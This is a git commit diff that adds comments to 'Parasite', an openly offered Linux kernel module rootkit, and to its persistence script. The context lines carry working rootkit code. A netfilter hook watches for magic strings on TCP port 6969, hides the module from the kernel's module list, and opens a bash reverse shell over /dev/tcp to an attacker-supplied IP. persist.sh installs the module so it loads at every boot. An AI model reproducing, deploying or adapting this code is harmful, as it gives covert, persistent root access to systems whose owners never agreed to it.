46c2632ca2fc5e78596eca09d3913abac7bca826
MurryPuppins <cjcarey314@gmail.com>
2022-04-09 21:15:27 -0400

    Updated comments in LKM.c and persist.sh

--- LKM.c
+++ LKM.c
@@ -1,8 +1,9 @@
 /*****************************************************
-* Parasite Rootkit Project
+* Parasite - Linux Kernel Module Rootkit
 * Authored by MurryPuppins
 
-* More to be added shortly
+* NOTE: By using this code/software, you agree to the disclaimer highlighted in README.md (repo found below)
+* https://github.com/MurryPuppins/Parasite
  *****************************************************/
 
 #include <linux/init.h>
@@ -14,22 +15,24 @@
 #include <linux/tcp.h>
 #include <linux/udp.h>
 
+// Flags utilized by Parasite to execute various actions
 const char* rootkit_hide = "ROOTKIT_HIDE";
 const char* rootkit_show = "ROOTKIT_SHOW";
 const char* rootkit_rshell = "ROOTKIT_RSHELL";
-const char* PORT = "5555";
+const char* PORT = "5555"; // SHELL-PORT: Change this if you want to bind reverse shell on a different port
 
 static struct nf_hook_ops *nfho = NULL;
 static struct list_head *module_previous; // Tracks linked-list LKM list
 static int module_track = 0; // Tracks whether module is hidden (0) or visible(1)
 
+// Defined vars for establishing reverse shell
 #define HOME "HOME=/root"
 #define TERM "TERM=xterm-256color"
 #define SHELL "/bin/bash"
 #define EXEC_P1 "bash -i >& /dev/tcp/"
 #define EXEC_P2 "0>&1"
 
-
+// Part of reverse_shell functionality
 struct shell_params {
 	struct work_struct work;
 	char* target_ip;
@@ -37,6 +40,7 @@ struct shell_params {
 };
 
 // Hides kernel module upon calling
+// TODO: Test duplicate calls and viability of 'module_track'
 void hide_rootkit(void)
 {
 	module_previous = THIS_MODULE->list.prev;
@@ -51,6 +55,9 @@ void show_rootkit(void){
 }
 
 
+// 2nd part of reverse-shell function
+// Credits: Ripped from d3adzo - poetry
+// TL;DR This is a polished implementation of call_usermodehelper
 void execute_reverse_shell(struct work_struct *work){
     int err;
     struct shell_params *params = (struct shell_params*)work;
@@ -78,6 +85,10 @@ void execute_reverse_shell(struct work_struct *work){
 
 }
 
+
+// 1st part of reverse-shell function
+// Credits: Ripped from d3adzo - poetry
+// TL;DR - Variable instantiations + memory allocations before passing into rshell function pt2
 int start_reverse_shell(char* ip, const char* port){
     int err;
     struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
@@ -96,7 +107,9 @@ int start_reverse_shell(char* ip, const char* port){
     return err;
 }
 
-// Hook function, does the schtuff
+// Hook function, does the schtuff (called when LKM is triggered)
+// TL;DR - If the packet doesn't match certain rules, it's accepted -
+// If it matches, the packet is dropped and the functionality is executed
 static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
 	// Variable Declarations
@@ -117,6 +130,7 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 
 		tcph = tcp_hdr(skb);
 		
+		// LISTENING-PORT: Default is 6969 (nice), change if desired!
 		if (ntohs(tcph->dest) != 6969) {
 				return NF_ACCEPT;
 		}
@@ -130,34 +144,40 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 			kfree(_data);
 			return NF_ACCEPT;
 		}
+
 		// Extracts the data from the packet payload
 		user_data = skb_header_pointer(skb, iph->ihl*4 + tcph->doff*4, size, &_data);
 		printk(KERN_DEBUG "%s\n", user_data); // for debugging purposes
 		
+		// If packet contains no data
 		if(!user_data){
 			printk(KERN_INFO "Packet is null!");
 			kfree(_data);
 			return NF_ACCEPT;
 		}
 
-		// Hides the rootkit from LKM list
+		// ROOTKIT_HIDE - Hides the rootkit from LKM list
 		if(memcmp(user_data, rootkit_hide, strlen(rootkit_hide)) == 0) {
 			hide_rootkit();
 			return NF_DROP;
 		}
 
-		// Puts rootkit back into LKM list
+		// ROOTKIT_SHOW - Puts rootkit back into LKM list
 		if(memcmp(user_data, rootkit_show, strlen(rootkit_show)) == 0) {
 			show_rootkit();
 			return NF_DROP;
 		}
+
+		// ROOTKITRSHELL<IP ADDR> - Takes string, grabs IP address, passes it to reverse-shell functions
 		if(memcmp(user_data, rootkit_rshell, strlen(rootkit_rshell)) == 0) {
 
-			//u32 ipsrc = ntohl(iph->saddr); Doesnt work as expected
+			//u32 ipsrc = ntohl(iph->saddr); Doesnt work as expected, will fix later
 			
 			char* ipsrc = kmalloc(32, GFP_KERNEL);
 			strncpy(ipsrc, user_data + 14, 32);
-			printk(KERN_INFO "IP ADDRESS IS: %s\n", ipsrc);
+
+			//printk(KERN_INFO "IP ADDRESS IS: %s\n", ipsrc); //debugging
+
 			start_reverse_shell(ipsrc, PORT);
 			kfree(ipsrc);
 			return NF_DROP;
@@ -172,14 +192,12 @@ static int __init LKM_init(void)
 {
 	nfho = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
 	
-	/* Initialize netfilter hook */
-	nfho->hook 	= (nf_hookfn*)hfunc;		/* hook function */
-	nfho->hooknum 	= NF_INET_PRE_ROUTING;		/* received packets */
-	nfho->pf 	= PF_INET;			/* IPv4 */
-	nfho->priority 	= NF_IP_PRI_FIRST;		/* max hook priority */
+	nfho->hook 	= (nf_hookfn*)hfunc;		 // Hooking function
+	nfho->hooknum 	= NF_INET_PRE_ROUTING;   // Specifies which part of netfilter's stage to be in
+	nfho->pf 	= PF_INET;			         // Specifies IPv4 usage, cuz IPv6 is ugly :(
+	nfho->priority 	= NF_IP_PRI_FIRST;		 // Establishes position in kernel netfilter priority list
 	
 	nf_register_net_hook(&init_net, nfho);
-	//module_hide();
 	return 0;
 }
 
--- persist.sh
+++ persist.sh
@@ -1,4 +1,5 @@
 # Persistence script (tested Ubuntu LTS 20.04)
+# If LKM is changed, update 'LKM' accordingly without '.ko'
 sudo cp ./LKM.ko /lib/modules/$(uname -r)/kernel/lib/
 depmod -a
 echo "LKM" >> /etc/modules
